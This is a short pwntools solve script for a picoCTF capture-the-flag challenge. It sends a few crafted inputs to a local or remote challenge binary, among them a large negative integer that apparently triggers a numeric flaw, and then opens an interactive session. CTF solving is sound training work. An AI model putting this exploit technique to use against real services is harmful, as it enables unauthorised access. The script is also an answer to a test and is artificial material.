from pwn import tube
from syoch_ctf.pwn import auto_solver


@auto_solver(
    local_executable="./system.out",
    remote_host="candy-mountain.picoctf.net",
    remote_port=52914,
)
def solve(p: tube):
    p.sendline(b"")
    p.sendline(b"0")
    p.sendline(b"-3209081493549540382")
    p.interactive()

    return "SolverSuccess"
